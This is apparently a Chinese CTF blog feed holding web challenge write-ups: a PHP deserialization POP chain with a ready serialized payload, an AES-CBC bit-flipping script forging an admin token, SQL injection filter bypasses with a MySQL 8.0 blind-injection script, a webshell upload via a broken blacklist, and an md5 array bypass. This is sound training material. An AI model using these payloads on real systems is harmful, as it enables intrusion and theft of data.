<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * flag in /home/flaaag.txt and go to flag.php</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">service</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$event</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;event[<span class="string">&quot;name&quot;</span>];<span class="comment">//__get</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="string">&quot;nonononono&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$txey</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">service</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$server</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;server-&gt;str))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span> . <span class="variable">$method</span> . <span class="variable language_">$this</span>-&gt;server-&gt;str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;now get flag!&quot;</span>; &#125;</span><br></pre></td></tr></table></figure>
<p>按照提示访问flag.php<br><img src="https://img-blog.csdnimg.cn/0019d8c830ff4e198e2d9d13d947c1fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;now get flag!&quot;</span>; &#125;</span><br></pre></td></tr></table></figure>
<p>在没有传入cmd值得情况下会显示now get flag!<br>由此确定该源码为flag.php得源码</p>
<p>代码审计初步确认此处应该使用反序列化漏洞构造pop链来访问&#x2F;home&#x2F;flaaag.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span>=<span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>=&gt;<span class="string">&quot;pp&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$age</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>=<span class="keyword">new</span> <span class="title function_ invoke__">read</span>(<span class="string">&#x27;/home/flaaag.txt&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;server=<span class="variable">$t</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">read</span>(<span class="variable">$t</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sf</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$sf</span>);</span><br></pre></td></tr></table></figure>
<p>在本地构造如上pop链后运行得到payload<br><img src="https://img-blog.csdnimg.cn/47c6394521f14118a7e2b64469e35032.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;event&quot;</span>;a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;pp&quot;</span>;&#125;s:<span class="number">6</span>:<span class="string">&quot;server&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;read&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;/home/flaaag.txt&quot;</span>;&#125;&#125;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag！<br><img src="https://img-blog.csdnimg.cn/308e72f9af364d3b979a8b2b3b852d2d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">]]></content>
      <tags>
        <tag>Web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>MiniLCTF2022 - Web</title>
    <url>/2022/05/07/minilctf2022/</url>
    <content><![CDATA[<h1 id="0x01-checkin"><a href="#0x01-checkin" class="headerlink" title="0x01 checkin"></a>0x01 checkin</h1><p><img src="https://img-blog.csdnimg.cn/fce621d05dd540289b62894e6360928e.png" alt="在这里插入图片描述"><br> 访问&#x2F;home提示Only admin can get the secret!，可以猜想本题采取了验证token的方式来判断是否为admin</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HomeController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	token, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	jsonUser, _ := utils.TokenDecrypt(token)</span><br><span class="line">	user := models.User&#123;&#125;</span><br><span class="line">	_ = json.Unmarshal([]<span class="type">byte</span>(jsonUser), &amp;user)</span><br><span class="line">	<span class="keyword">if</span> user.Name == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		file, _ := os.Open(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">		<span class="keyword">defer</span> file.Close()</span><br><span class="line">		content, _ := ioutil.ReadAll(file)</span><br><span class="line">		_, _ = c.Writer.WriteString(<span class="type">string</span>(content))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		_, _ = c.Writer.WriteString(<span class="string">&quot;Only admin can get the secret!&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看源码可以知道token经过解密后判断<code>user.Name</code>字段是否为admin，如果为admin就直接打开flag</p>
<p><strong>源码中的token加密</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TokenEncrypt</span><span class="params">(user []<span class="type">byte</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	originData := pad(user, blockSize)</span><br><span class="line">	blockMode := cipher.NewCBCEncrypter(block, iv)</span><br><span class="line">	encrypted := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(originData))</span><br><span class="line">	blockMode.CryptBlocks(encrypted, originData)</span><br><span class="line">	<span class="keyword">return</span> base64.StdEncoding.EncodeToString(<span class="built_in">append</span>([]<span class="type">byte</span>(config.IV), encrypted...)), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出是aes加密，cbc模式，最后将iv和密文拼接后得到token</p>
<p>到了这一步可以联想到aes算法的cbc翻转攻击，通过改变上一组的密文来使当前组的密文解密结果发送变化</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IndexController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	_, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">		c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	user := models.User&#123;Name: <span class="string">&quot;guest&quot;</span>, CreateAt: time.Now().Unix(), IP: c.ClientIP()&#125;</span><br><span class="line">	jsonUser, _ := json.Marshal(user)</span><br><span class="line">	token, _ := utils.TokenEncrypt(jsonUser)</span><br><span class="line">	c.SetCookie(<span class="string">&quot;token&quot;</span>, token, <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">	c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续在源码中获取到明文的格式<code>&#123;Name: &quot;guest&quot;, CreateAt: time.Now().Unix(), IP: c.ClientIP()&#125;</code>只用把<code>guest</code>翻转为<code>admin</code>即可，以下为解题脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">plain=<span class="string">&#x27;&#123;&quot;Name&quot;:&quot;guest&quot;,&quot;CreateAt&quot;:1651386949,&quot;IP&quot;:&quot;127.0.0.1&quot;&#125;&#x27;</span></span><br><span class="line">tx = [<span class="number">123</span>, <span class="number">34</span>, <span class="number">78</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">34</span>, <span class="number">58</span>, <span class="number">34</span>, <span class="number">103</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">34</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">67</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">116</span>, <span class="number">34</span>, <span class="number">58</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">53</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">54</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">57</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">73</span>, <span class="number">80</span>, <span class="number">34</span>, <span class="number">58</span>, <span class="number">34</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">34</span>, <span class="number">125</span>]</span><br><span class="line">token=<span class="string">&quot;MDAwMTE0NTE0MTkxOTgxMOSJAwAU25w%2BxwD1vPGvUJHg5CSOXQDhJ9gGync9G1%2FlP5S4EDx%2FeZt3YoDMGWsjKSPLSoF4SsROuNB1J2yVfHI%3D&quot;</span></span><br><span class="line">token=parse.unquote(token)</span><br><span class="line">origin=base64.b64decode(token)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tx)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(tx[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">vi=<span class="built_in">bytearray</span>(origin[:<span class="number">16</span>])</span><br><span class="line">cipher=origin[<span class="number">16</span>:]</span><br><span class="line"><span class="built_in">print</span>(vi)</span><br><span class="line"></span><br><span class="line">vi[<span class="number">9</span>]=vi[<span class="number">9</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;g&#x27;</span>)^<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">vi[<span class="number">10</span>]=vi[<span class="number">10</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;u&#x27;</span>)^<span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">vi[<span class="number">11</span>]=vi[<span class="number">11</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>)^<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">vi[<span class="number">12</span>]=vi[<span class="number">12</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>)^<span class="built_in">ord</span>(<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">vi[<span class="number">13</span>]=vi[<span class="number">13</span>]^<span class="built_in">ord</span>(<span class="string">&#x27;t&#x27;</span>)^<span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(vi)</span><br><span class="line"></span><br><span class="line">new_iv=<span class="built_in">bytes</span>(vi)</span><br><span class="line"><span class="built_in">print</span>(parse.quote(base64.b64encode(new_iv+cipher)))</span><br></pre></td></tr></table></figure>


<h1 id="0x02-mini-sql"><a href="#0x02-mini-sql" class="headerlink" title="0x02 mini_sql"></a>0x02 mini_sql</h1><p>一道简洁的sql注入题目，目的明确，注出用户名密码登陆后即可得到flag<br>注释中给出sql语句<code>   &lt;!-- select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;; --&gt;</code>，本题过滤了#注释符和单引号，无法将语句提前闭合，可以在用户名处以反斜杠<code>\</code>结尾，将username之后的单引号注释，从而让password处的内容全部连接到sql语句中，这是常规注入方式</p>
<p>or被过滤  &#x3D;&gt;<code>||</code>代替<br>#被过滤   &#x3D;&gt;<code>;%00</code>代替<br>substr被过滤  &#x3D;&gt;<code>mid</code>代替</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">||<span class="built_in">ascii</span>(mid(version(),&#123;i&#125;,<span class="number">1</span>))=&#123;j&#125;;%<span class="number">00</span></span><br><span class="line">用这种形式的payload可以注出版本号（<span class="number">8.0</span>.xxx）以及库名（ctf）</span><br></pre></td></tr></table></figure>
<p>但本题的盲注由于select被过滤，所以无法继续，尝试大小写和截断均无法绕过</p>
<p>select被过滤一般只有在堆叠注入的情况下才可以绕过，除了极个别不需要select可以直接用password或者flag进行查询的情况</p>
<ol>
<li>预编译注入</li>
<li>Handler查询</li>
</ol>
<p>但经过尝试后均失败，本题无法堆叠注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">||<span class="built_in">ascii</span>(mid(username,&#123;i&#125;,<span class="number">1</span>))=&#123;j&#125;;%<span class="number">00</span></span><br><span class="line">尝试用简化查询语句，发现可以注出username，</span><br><span class="line">但我继续注password时发现因为<span class="keyword">or</span>的过滤导致语句无法通过，本题差一点点被非预期</span><br></pre></td></tr></table></figure>
<p><strong>MYSQL8.0注入新特性</strong><br>当所有的常规方法用完后，终于发现了一条新路线，利用mysql8.0的新特性进行注入，<br>出现了两个新的关键字table和values</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>():</span><br><span class="line">    password=<span class="string">&#x27;cd51c1005cab68be2f7e6112a4de3e89&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str_range:</span><br><span class="line">        <span class="comment">#payload=f&quot;||ascii(mid(username,&#123;i&#125;,1))=&#123;j&#125;;%00&quot;#||ascii(mid((table users limit 0,1),1,1))&gt;1;</span></span><br><span class="line">        payload=<span class="string">f&#x27;||(table users limit 1)&gt;=(1,&quot;w3lc0me_t0_m1n1lct5&quot;,&quot;<span class="subst">&#123;password+<span class="built_in">chr</span>(j)&#125;</span>&quot;);%00&#x27;</span></span><br><span class="line">        mydata = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;1\\&#x27;</span>,</span><br><span class="line">                  <span class="string">&#x27;password&#x27;</span>: unquote(payload)</span><br><span class="line">                  &#125;</span><br><span class="line">        txt = requests.post(url, data=mydata).text</span><br><span class="line">        <span class="built_in">print</span>(txt,<span class="built_in">chr</span>(j))</span><br></pre></td></tr></table></figure>
<p>类似于无列名注入，得到账号密码后登录获取flag</p>
<h1 id="0x03-include"><a href="#0x03-include" class="headerlink" title="0x03 include"></a>0x03 include</h1><p><img src="https://img-blog.csdnimg.cn/a8fd32c0ba4a4d128a68441bdeb05b85.png" alt="在这里插入图片描述"><br>一个简洁的文件上传，当尝试上传时为显示Only members of Lteam can use it.，那么一定与user有关<br><img src="https://img-blog.csdnimg.cn/25e74777c2ae41c8b9dc72a8161dbd4a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1c26ab489011452ca6683420a5d96e65.png" alt="在这里插入图片描述"></p>
<p>将user解码后修改为Lteam即可正常使用上传功能<br><img src="https://img-blog.csdnimg.cn/f898af9d2a0848edb157c587fa5771eb.png" alt="在这里插入图片描述"><br>成功传入一句话木马，直接蚁剑连接getshell，根目录下得到flag</p>
<p><strong>本题为非预期</strong><br>出题人upload.php写错了，直接把php传上去了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>();</span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="string">&quot;./upload&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$usergroup</span>=<span class="string">&#x27;Tourist&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">user</span>())));</span><br><span class="line"></span><br><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;ini&quot;</span>,<span class="string">&quot;js&quot;</span>,<span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;as&quot;</span>,<span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="string">&quot;file&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&#x27;.&#x27;</span>.<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;upload&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;usergroup!=<span class="string">&#x27;Lteam&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Only members of Lteam can use it.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error！&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;文件已存在！&quot;</span>.<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file_name</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&quot;./&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable">$pathshow</span> = <span class="string">&quot;./upload/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable">$info</span> = <span class="string">&quot;filename: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] .<span class="string">&quot;;&quot;</span>. <span class="string">&quot;&lt;br&gt;&quot;</span>. <span class="string">&quot;type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] .<span class="string">&quot;;&quot;</span>. <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;size: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&quot;</span>.<span class="string">&quot;;&quot;</span>. <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;path:&quot;</span> . <span class="variable">$pathshow</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;上传成功！&quot;</span>. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$info</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><code>stristr($file_name, $deny_ext)</code>函数碰到数组爆错了，设置的黑名单也就无效了，导致这个题被狠狠的非预期</p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>HECTF mmmmd5d5d5d5</title>
    <url>/2021/11/14/mmmmd5d5d5d5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考察php的语言特性和md5</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">



<h1 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h1><p><img src="https://img-blog.csdnimg.cn/1d6ef07bf21f46449f35bd4aa0332c54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开题目后界面上只有一句话<br><img src="https://img-blog.csdnimg.cn/fb2691c7d0a24f46ae1a48a18c853eb5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>查看源代码后发现注释部分有提示，要以Get方式传入两个参数，<br>要求<code>$a != $b &amp;&amp; md5($a) == md5($b)</code>，直接传入数组进行绕过<br><img src="https://img-blog.csdnimg.cn/a86281bd66524f7c9246caa1d7c1aeda.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h1 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h1><p><img src="https://img-blog.csdnimg.cn/dbc48e7c032f47faa11cc13f1cbbbfa9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>进入下一个界面后要求输入一个串值，取其md5值，再进行<code>substr(5,5)</code>后等于题目给定的随机字符串，图中为<code>bee38</code>，这种md5截取比较的题目需要自己写脚本爆破</p>
